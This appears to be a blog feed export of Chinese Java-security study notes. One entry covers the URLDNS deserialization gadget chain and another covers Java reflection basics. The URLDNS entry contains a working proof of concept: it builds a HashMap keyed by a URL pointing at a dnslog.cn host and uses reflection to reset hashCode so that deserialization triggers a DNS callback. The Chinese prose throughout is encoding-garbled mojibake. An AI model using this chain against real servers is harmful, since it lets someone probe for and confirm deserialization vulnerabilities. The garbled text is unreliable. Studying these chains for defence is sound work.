<p>é‚£æˆ‘ä»¬æ€è€ƒï¼Œå‡å¦‚æœ‰ä¸ªaç±»æœ‰<code>hashCode()</code>æ–¹æ³•ï¼ŒæŠŠaç±»ä½œä¸ºhashMapçš„keyï¼Œåœ¨è¿™é‡Œå°±ç›¸å½“äºè°ƒç”¨aç±»çš„<code>hashCode()</code>ï¼Œè¿™å°±æ˜¯åŒåå‡½æ•°è°ƒç”¨ã€‚</p>
<h3 id="URLç±»"><a href="#URLç±»" class="headerlink" title="URLç±»"></a>URLç±»</h3><p>æ‰¿æ¥ä¸Šæ–‡ï¼Œ<strong>URL</strong>ç±»ä¸­æœ‰<code>hashCode()</code>æ–¹æ³•,<code>hashCode()</code>è¢«handlerè°ƒç”¨ï¼Œhandler åˆæ˜¯ <strong>URLStreamHandler</strong> çš„æŠ½è±¡ç±»ï¼Œæˆ‘ä»¬å†å»æ‰¾ <strong>URLStreamHandler</strong> çš„ <code>hashCode()</code> æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509102412486.png" alt="image-20240509102412486"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><code>hashCode()</code>æ–¹æ³•ä¼ å…¥ä¸€ä¸ªurlï¼Œ<code>getHostAddress(url)</code></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103443938.png" alt="image-20240509103443938"></p>
<p>è¿›å…¥<code>getHostAddress()</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509103838469.png" alt="image-20240509103838469"></p>
<p>è¿™æ®µä»£ç æ„æ€æ˜¯è·å–ç»™å®š URL å¯¹è±¡çš„ä¸»æœºåœ°å€ã€‚å¦‚æœä¸»æœºåœ°å€å·²ç»ç¼“å­˜è¿‡ï¼Œåˆ™ç›´æ¥è¿”å›ç¼“å­˜çš„åœ°å€ï¼›å¦åˆ™ï¼Œå°è¯•è§£æä¸»æœºåè·å–ä¸»æœºåœ°å€ï¼Œå¹¶ç¼“å­˜ç»“æœã€‚åœ¨â½¹ç»œä¸Šå…¶å®å°±æ˜¯â¼€æ¬¡ DNS æŸ¥è¯¢ã€‚</p>
<p><strong>æµç¨‹</strong></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// é¦–å…ˆé€šè¿‡HashMapçš„readObjectå‡½æ•°,ä¼šè°ƒç”¨putVal()å‡½æ•°è®¡ç®—hasHmapçš„key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)ä¼šå¯¹keyè°ƒç”¨hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// å¦‚æœä¼ å…¥çš„key æ˜¯ä¸€ä¸ªURLå¯¹è±¡</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// ç„¶åä¼šè§¦å‘URLå¯¹è±¡hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// å¦‚æœhashcodeä¸ä¸º-1,å°±ä¼šè°ƒç”¨handlerçš„hashcode,å¹¶ä¸”ä¼ å…¥url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// åœ¨handlerçš„hashcodeé‡Œé¢ä¼šè°ƒç”¨getHostAddress,å‚æ•°æ˜¯url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// æœ€åå‘èµ·ä¸€æ¬¡dnsè¯·æ±‚</span><br><span class="hljs-number">7</span>. dnsè¯·æ±‚<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="URLDNSé“¾"><a href="#URLDNSé“¾" class="headerlink" title="URLDNSé“¾"></a>URLDNSé“¾</h2><p>å‚è€ƒä¸Šé¢çš„æµç¨‹ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªhashMapï¼Œåœ¨hashMapçš„keyä¼ å…¥urlå¯¹è±¡ï¼Œçœ‹<strong>URL</strong>çš„æ„é€ æ–¹æ³•ï¼Œæœ€ç®€å•çš„æ„é€ æ–¹æ³•ç›´æ¥æ”¾å…¥ä¸€ä¸ªurlåœ°å€å°±å¯ä»¥</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145326944.png" alt="image-20240509145326944"></p>
<p>hashMapä¸ç›´æ¥ç›´æ¥ä¼ å‚ï¼Œå¿…é¡»ç”¨<code>put()</code>æ–¹æ³•ï¼Œputè¿›å»ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509145753562.png" alt="image-20240509145753562"></p>
<p>å¦‚æœä¸€åˆ‡é¡ºåˆ©çš„è¯</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// é¦–å…ˆé€šè¿‡HashMapçš„readObjectå‡½æ•°,ä¼šè°ƒç”¨putVal()å‡½æ•°è®¡ç®—hasHmapçš„key</span><br><span class="hljs-number">1</span>. HashMap -&gt; <span class="hljs-built_in">readObject</span>() -&gt; <span class="hljs-built_in">putVal</span>() -&gt; <span class="hljs-built_in">hash</span>(key) <br><span class="hljs-comment">//hash(Object key)ä¼šå¯¹keyè°ƒç”¨hashCode()</span><br><span class="hljs-number">2</span>. key<span class="hljs-selector-class">.hashCode</span>()<br><span class="hljs-comment">// å¦‚æœä¼ å…¥çš„key æ˜¯ä¸€ä¸ªURLå¯¹è±¡</span><br><span class="hljs-number">3</span>. key = URL url<br><span class="hljs-comment">// ç„¶åä¼šè§¦å‘URLå¯¹è±¡hashcode()</span><br><span class="hljs-number">4</span>. url<span class="hljs-selector-class">.hashcode</span>()<br><span class="hljs-comment">// å¦‚æœhashcodeä¸ä¸º-1,å°±ä¼šè°ƒç”¨handlerçš„hashcode,å¹¶ä¸”ä¼ å…¥url</span><br><span class="hljs-number">5</span>. url<span class="hljs-selector-class">.handler</span><span class="hljs-selector-class">.hashcode</span>(url)<br><span class="hljs-comment">// åœ¨handlerçš„hashcodeé‡Œé¢ä¼šè°ƒç”¨getHostAddress,å‚æ•°æ˜¯url</span><br><span class="hljs-number">6</span>. <span class="hljs-built_in">getHostAddress</span>(url)<br><span class="hljs-comment">// æœ€åå‘èµ·ä¸€æ¬¡dnsè¯·æ±‚</span><br><span class="hljs-number">7</span>. dnsè¯·æ±‚<br></code></pre></td></tr></table></figure>

<h3 id="åˆé‡éš¾é¢˜"><a href="#åˆé‡éš¾é¢˜" class="headerlink" title="åˆé‡éš¾é¢˜"></a>åˆé‡éš¾é¢˜</h3><p>ä½†æ˜¯æˆ‘ä»¬å‘ç°åœ¨åºåˆ—åŒ–çš„æ—¶å€™å°±å·²ç»è§¦å‘äº†</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509150138622.png" alt="image-20240509150138622"></p>
<p>è·Ÿè¿›<strong>hashMap</strong>çš„<code>put()</code>æ–¹æ³•ï¼Œå‘ç°åœ¨putçš„æ—¶å€™å°±å·²ç»å¯¹keyè¿›è¡Œä¸€æ¬¡<code>hash()</code>äº†ï¼Œè§¦å‘äº†<strong>URL</strong>ç±»çš„<code>hashCode()</code>æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509111302937.png" alt="image-20240509111302937"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152432465.png" alt="image-20240509152432465"></p>
<p>æˆ‘ä»¬å‘ç°ï¼Œå½“ <code>hashCode</code> çš„å€¼ä¸ç­‰äº -1 çš„æ—¶å€™ï¼Œå‡½æ•°å°±ä¼šç›´æ¥ <code>return hashCode</code> è€Œä¸æ‰§è¡Œ <code>hashCode = handler.hashCode(this);</code>ã€‚è€Œä¸€å¼€å§‹å®šä¹‰ HashMap ç±»çš„æ—¶å€™<code>hashCode</code> çš„å€¼ä¸º -1ï¼Œä¾¿æ˜¯å‘èµ·äº†è¯·æ±‚ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240509152449960.png" alt="image-20240509152449960"></p>
<h3 id="è§£å†³é—®é¢˜"><a href="#è§£å†³é—®é¢˜" class="headerlink" title="è§£å†³é—®é¢˜"></a>è§£å†³é—®é¢˜</h3><p>æ€è·¯ï¼šåœ¨putå‰ï¼Œä½¿hashCodeä¸ç­‰äº-1ï¼ŒputåhashCodeç­‰äº-1</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;<br>        <br>         <span class="hljs-comment">//æ€è·¯</span><br>        <span class="hljs-comment">//HashMap&lt;URL, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br>        <span class="hljs-comment">//å°†hashCOdeå€¼æ”¹ä¸ºä¸æ˜¯-1ï¼Œput()çš„æ—¶å€™å°±ä¸ä¼šå‘èµ·è¯·æ±‚</span><br>        <span class="hljs-comment">//URL url = new URL(&quot;http://jhc0ym.dnslog.cn&quot;);</span><br>       <br>        <span class="hljs-comment">//hashMap.put(url, 1);</span><br>        <span class="hljs-comment">//å°†hashCodeå€¼æ”¹ä¸º-1</span><br>        <br>        <span class="hljs-comment">//Serialization(hashMap);</span><br>        <br>        <span class="hljs-comment">//å®ç°</span><br>        HashMap&lt;URL, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(); <span class="hljs-comment">//æ–°å»ºä¸€ä¸ªhashMap</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://jhc0ym.dnslog.cn&quot;</span>);  <span class="hljs-comment">//url</span><br>        <br>        Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">URL</span>&gt; c = url.getClass();  <span class="hljs-comment">//è·å–ä¸€ä¸ªClass</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCodefile</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);  <span class="hljs-comment">//è·å–hashCodeå­—æ®µ</span><br>        hashCodefile.setAccessible(<span class="hljs-literal">true</span>);  <span class="hljs-comment">//è®¾ç½®å­—æ®µè®¿é—®æƒé™</span><br>        hashCodefile.set(url, <span class="hljs-number">123</span>);	 <span class="hljs-comment">//å°†hashCodeæ”¹ä¸º123</span><br><br><br>        hashMap.put(url, <span class="hljs-number">1</span>);<br>        hashCodefile.set(url, -<span class="hljs-number">1</span>);  <span class="hljs-comment">//putå®Œåæ”¹ä¸º-1</span><br><span class="hljs-comment">//        Serialization(hashMap);</span><br>        Deserialization(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Serialization</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123; <span class="hljs-comment">//åºåˆ—åŒ–</span><br><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        outputStream.writeObject(obj);<br><br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Deserialization</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;  <span class="hljs-comment">//ååºåˆ—åŒ–</span><br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        inputStream.readObject();<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>



<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://juejin.cn/post/6844903954774491144#heading-5">ä¸ºä»€ä¹ˆhashMapè¦å®ç°è‡ªå·±çš„writeObjectå’ŒreadObjectæ–¹æ³•</a></p>
<p><a href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#%E5%AE%9E%E6%88%98-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-URLDNS">Javaååºåˆ—åŒ–åŸºç¡€ç¯‡-01-ååºåˆ—åŒ–æ¦‚å¿µä¸åˆ©ç”¨</a></p>
<p><a href="https://www.bilibili.com/video/BV16h411z7o9?p=2&vd_source=d195054a6a081ba07486dcc86c6ba707">Javaååºåˆ—åŒ–æ¼æ´ä¸“é¢˜-åŸºç¡€ç¯‡(21&#x2F;09&#x2F;05æ›´æ–°ç±»åŠ è½½éƒ¨åˆ†)</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVAå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>åå°„</title>
    <url>/2024/05/16/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å­¦ä¹ Javaçš„åå°„æœºåˆ¶æ˜¯ä¸ºäº†ç†è§£Apache Commons Collectionsä¸­çš„ååºåˆ—åŒ–æ¼æ´åšå‡†å¤‡çš„ã€‚</p>
<h2 id="åå°„æ¦‚å¿µ"><a href="#åå°„æ¦‚å¿µ" class="headerlink" title="åå°„æ¦‚å¿µ"></a>åå°„æ¦‚å¿µ</h2><p>åå°„æ˜¯ä¸€ç§é—´æ¥æ“ä½œç›®æ ‡å¯¹è±¡çš„æœºåˆ¶ï¼Œå…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶è·å–ç±»çš„ä¿¡æ¯ï¼Œå¹¶ä¸”åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°åˆ›å»ºå¯¹è±¡ã€è°ƒç”¨æ–¹æ³•ã€è®¿é—®å­—æ®µç­‰ç­‰ï¼›<strong>å¯¹äºä»»æ„ä¸€ä¸ªç±»éƒ½èƒ½å¤ŸçŸ¥é“è¿™ä¸ªç±»æ‰€æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼Œå¹¶ä¸”å¯¹äºä»»æ„ä¸€ä¸ªå¯¹è±¡ï¼Œéƒ½èƒ½å¤Ÿè°ƒç”¨å®ƒçš„æ–¹æ³•&#x2F;è®¿é—®å±æ€§ã€‚</strong></p>
<hr>
<p>å®è´¨å°±æ˜¯å¾—åˆ°ä¸€ä¸ªClasså¯¹è±¡åï¼Œåå‘è·å–Classå¯¹è±¡çš„å¯¹è±¡ã€‚</p>
<h2 id="Classç±»ã€Classå¯¹è±¡ä¸classå…³é”®å­—"><a href="#Classç±»ã€Classå¯¹è±¡ä¸classå…³é”®å­—" class="headerlink" title="Classç±»ã€Classå¯¹è±¡ä¸classå…³é”®å­—"></a>Classç±»ã€Classå¯¹è±¡ä¸classå…³é”®å­—</h2><p><code>Classç±»</code>æ˜¯javaä¸­çš„ä¸€ä¸ªç±»ï¼Œä½äº<strong>java.lang</strong>åŒ…ä¸­ã€‚å®ƒæä¾›äº†ç”¨äºè·å–ç±»ä¿¡æ¯å’Œæ“ä½œç±»æˆ–å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•çš„æ–¹æ³•ã€‚<img src="https://image.sp4rks.xyz/2024/06/image-20240514205516919.png" alt="image-20240514205516919"></p>
<p><code>Classå¯¹è±¡</code>æ˜¯JVMåœ¨è¿è¡Œæ—¶ä¿ç•™çš„æ¯ä¸ªç±»çš„æè¿°ä¿¡æ¯ã€‚Classå¯¹è±¡åŒ…å«äº†è¯¥ç±»çš„æ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»çš„åç§°ã€å±æ€§ã€æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ã€‚Classå¯¹è±¡å¯ä»¥é€šè¿‡Classç±»çš„å„ç§æ–¹æ³•è·å–ã€‚</p>
<p><code>class</code>æ˜¯javaçš„å…³é”®å­—ï¼Œç”¨äºå£°æ˜ç±»ã€‚</p>
<hr>
<p><strong>å¯¹Classç±»è§£è¯»:</strong></p>
<p>æˆ‘ä»¬é€šå¸¸è®¤ä¸ºç±»æ˜¯å¯¹è±¡çš„æŠ½è±¡å’Œé›†åˆï¼ŒClasså°±ç›¸å½“äºæ˜¯å¯¹ç±»çš„æŠ½è±¡å’Œé›†åˆã€‚<br>ä¹Ÿå¯ä»¥è®¤ä¸ºå¯¹è±¡æ˜¯ç±»çš„å®ä¾‹ï¼Œç±»æ˜¯Classçš„å®ä¾‹ã€‚</p>
<h2 id="è·å–Classå¯¹è±¡"><a href="#è·å–Classå¯¹è±¡" class="headerlink" title="è·å–Classå¯¹è±¡"></a>è·å–Classå¯¹è±¡</h2><p>é€šå¸¸æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•è·å–ä¸€ä¸ªç±»çš„Classå¯¹è±¡</p>
<h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;Test&quot;</span>);     å¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿â½¤ forName æ¥è·å–<br></code></pre></td></tr></table></figure>

<h3 id="Test-class"><a href="#Test-class" class="headerlink" title="Test.class"></a>Test.class</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Class&lt;?&gt; bClass = Test.class;    å¦‚æœå·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„ java.lang.Class å¯¹è±¡ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥æ‹¿å®ƒçš„classå±æ€§ã€‚<br></code></pre></td></tr></table></figure>

<h3 id="obj-getClass"><a href="#obj-getClass" class="headerlink" title="obj.getClass()"></a>obj.getClass()</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Test cClass= <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br>Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Test</span>&gt; aClass1 = cClass.getClass();  å¦‚æœä¸Šä¸‹â½‚ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ obj ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡ obj.getClass() æ¥è·å–å®ƒçš„ç±»<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/image-20240514215718317.png" alt="image-20240514215718317"></p>
<p>ä½†åœ¨è¿™ä¸‰ç§è·å–CLassç±»æ–¹å¼ä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ç¬¬ä¸‰ç§é€šè¿‡Class.forNameæ–¹æ³•å»åŠ¨æ€åŠ è½½ç±»ã€‚ä¸”ä½¿ç”¨forNameå°±ä¸éœ€è¦importå¯¼å…¥å…¶ä»–ç±»ï¼Œå¯ä»¥åŠ è½½æˆ‘ä»¬ä»»æ„çš„ç±»ã€‚</p>
<h2 id="å®ä¾‹åŒ–å¯¹è±¡"><a href="#å®ä¾‹åŒ–å¯¹è±¡" class="headerlink" title="å®ä¾‹åŒ–å¯¹è±¡"></a>å®ä¾‹åŒ–å¯¹è±¡</h2><p>è·å–åˆ°Classä¹‹åï¼Œå®ä¾‹åŒ–å¯¹è±¡ï¼Œ<code>newInstance()</code>æ–¹æ³•è°ƒç”¨æ— å‚çš„æ„é€ å™¨åˆ›å»ºå¯¹è±¡ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516090748055.png" alt="image-20240516090748055"></p>
<p>(<strong>Class</strong>ç±»ä¸­çš„<code>newInstance()</code>æ–¹æ³•)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102707921.png" alt="image-20240516102707921"></p>
<p><code>java.lang.relect.Constructor</code>ç±»é‡Œä¹Ÿæœ‰ä¸€ä¸ª<code>newInstance()</code>æ–¹æ³•å¯ä»¥åˆ›å»ºå¯¹è±¡ï¼Œè¯¥æ–¹æ³•å’ŒClassç±»ä¸­çš„<code>newInstance()</code>æ–¹æ³•å¾ˆåƒï¼Œä½†æ˜¯ç›¸æ¯”ä¹‹ä¸‹ï¼ŒConstructorç±»çš„<code>newInstance()</code>æ–¹æ³•æ›´åŠ å¼ºå¤§ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ª<code>newInstance()</code>æ–¹æ³•è°ƒç”¨æœ‰å‚æ•°çš„å’Œç§æœ‰çš„æ„é€ æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102944537.png" alt="image-20240516102944537"></p>
<p>è¿™æ—¶æœ‰ä¸ªé—®é¢˜ï¼Œæ¯”å¦‚ä¸€ä¸ªç±»æœ‰å¾ˆå¤šçš„æ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬æ€ä¹ˆèƒ½æ‰¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ„é€ æ–¹æ³•å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>getConstructor()</code>,å®ƒæ ¹æ®æä¾›çš„å‚æ•°ç±»å‹æ¥å®šä½ç‰¹å®šçš„æ„é€ å‡½æ•°ã€‚å¯ä»¥ä»<code>getConstructor()</code>çš„å‡½æ•°å£°æ˜ä¸­çœ‹åˆ°ï¼Œå‚æ•°ç±»å‹æ˜¯Classå¯å˜é•¿å‚æ•°ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516094652144.png" alt="image-20240516094652144"></p>
<p>å› ä¸ºTestç±»ä¸­æœ‰ä¸¤ä¸ªå±æ€§ï¼Œ<strong>Sting name</strong>å’Œ<strong>int age</strong>ï¼Œ<code>getConstructor()</code>å¡«å…¥<strong>String.class</strong>å’Œ<strong>int.class</strong>,å‘ç°æŠ¥é”™äº†ï¼ŒæŠ¥é”™ä¿¡æ¯æç¤ºæ²¡æœ‰è¿™ä¸ªæ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516091359629.png" alt="image-20240516091359629"></p>
<p>å¯ä»¥çœ‹åˆ°Testç±»ä¸­<strong>age</strong>å±æ€§æ˜¯ç§æœ‰çš„ï¼Œè¿™æ—¶ä½¿ç”¨<code>getDeclaredConstructor()</code>æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516090723742.png" alt="image-20240516090723742"></p>
<p>è®¾ç½®è®¿é—®æƒé™ä¸ºtrueã€‚å°±å¯ä»¥é€šè¿‡æœ‰å‚æ„é€ å‡½æ•°å®ä¾‹åŒ–å¯¹è±¡ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516091419131.png" alt="image-20240516091419131"></p>
<h2 id="è·å–ç±»çš„å±æ€§"><a href="#è·å–ç±»çš„å±æ€§" class="headerlink" title="è·å–ç±»çš„å±æ€§"></a>è·å–ç±»çš„å±æ€§</h2><p>é€šè¿‡<code>getFields()</code>å¯ä»¥è·å–å±æ€§ï¼Œä½†æ˜¯å‘ç°è¿™é‡Œåªè·å–äº†nameï¼Œageå¹¶æ²¡æœ‰è¢«è·å–ï¼ŒåŸå› å…¶å®å’Œä¸Šé¢ç±»ä¼¼ï¼Œå¿…é¡»ç”¨<code>getDeclaredFields()</code>å¹¶è®¾ç½®è®¿é—®æƒé™ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516095310090.png" alt="image-20240516095310090"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516095330837.png" alt="image-20240516095330837"> </p>
<p><code>set()</code>æ–¹æ³•é€šå¸¸å’Œ<code>getField()</code>æ­é…ä½¿ç”¨,<code>set()</code>æ–¹æ³•æ˜¯<code>Field</code>ç±»çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºé€šè¿‡åå°„æœºåˆ¶è®¾ç½®å¯¹è±¡çš„å­—æ®µå€¼ï¼Œå…·ä½“ä¸€ç‚¹å°±æ˜¯<code>Field</code>å¯¹è±¡è¡¨ç¤ºç±»ä¸­çš„ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œ<code>set()</code>æ–¹æ³•å…è®¸ä¿®æ”¹è¿™ä¸ªå­—æ®µçš„å€¼ï¼Œå³ä½¿è¯¥å­—æ®µæ˜¯ç§æœ‰çš„ã€‚åœ¨ä½¿ç”¨ä¹‹å‰ï¼Œé€šå¸¸éœ€è¦è°ƒç”¨<code>setAccessible(true)</code>æ¥ç»•è¿‡Javaçš„è®¿é—®æ§åˆ¶æ£€æŸ¥ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516101853830.png" alt="image-20240516101853830"></p>
<p><strong>age</strong>å±æ€§æ˜¯ç§æœ‰çš„</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102050549.png" alt="image-20240516102050549"></p>
<p>ï¼ˆé€šè¿‡<code>getDeclaredField()</code>è®¾ç½®è®¿é—®æƒé™ï¼‰</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516102124715.png" alt="image-20240516102124715"></p>
<h2 id="è°ƒç”¨ç±»çš„æ–¹æ³•"><a href="#è°ƒç”¨ç±»çš„æ–¹æ³•" class="headerlink" title="è°ƒç”¨ç±»çš„æ–¹æ³•"></a>è°ƒç”¨ç±»çš„æ–¹æ³•</h2><p>Testç±»æœ‰public Helloæ–¹æ³•å’ŒPrivate prHelloæ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516113808489.png" alt="image-20240516113808489"></p>
<p>é€šè¿‡<code>getMethods()</code>å¯ä»¥è·å–å…¬å…±æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516112756232.png" alt="image-20240516112756232"></p>
<p>é€šè¿‡<code>getDeclaredMethods()</code>å¯ä»¥è·å–å…¬å…±æ–¹æ³•å’Œç§æœ‰æ–¹æ³•</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516112826908.png" alt="image-20240516112826908"></p>
<p><code>getMethod()</code>é€šå¸¸å’Œ<code>invoke()</code>æ­é…ï¼Œ<code>invoke()</code>å¯ä»¥åŠ¨æ€åœ°åœ¨è¿è¡Œæ—¶è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•ã€‚å…¶å®ä¹Ÿä¸éš¾ç†è§£ï¼Œæˆ‘ä»¬é€šè¿‡<code>getMethod()</code>åå°„è·å¾—ä¸€ä¸ªæ–¹æ³•åï¼Œè‚¯å®šéœ€è¦æŒ‡å®šæ˜¯å“ªä¸ªç±»ï¼Œå¹¶ä¸”æŒ‡æ˜æ‰§è¡Œçš„å‚æ•°ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516131226025.png" alt="image-20240516131226025"></p>
<p>ç”¨<code>getMethod()</code>è°ƒç”¨ä¸€ä¸‹Testç±»ä¸­çš„<code>Hello()</code>æ–¹æ³•ï¼Œå¯ä»¥å‘ç°å®ƒè°ƒç”¨çš„æ˜¯æ— å‚çš„æ–¹æ³•ï¼Œå’Œå®ä¾‹åŒ–å¯¹è±¡çš„æƒ…å†µç±»ä¼¼ï¼ŒæŠ¥é”™äº†ï¼Œéœ€è¦æŒ‡æ˜å®ƒçš„ç±»å‹ï¼Œå¦åˆ™è°ƒç”¨æ— å‚çš„æ–¹æ³•ã€‚</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240516130413038.png" alt="image-20240516130413038"></p>
<p>(Classç±»ä¸­çš„<code>getMethod()</code>æ–¹æ³•)</p>
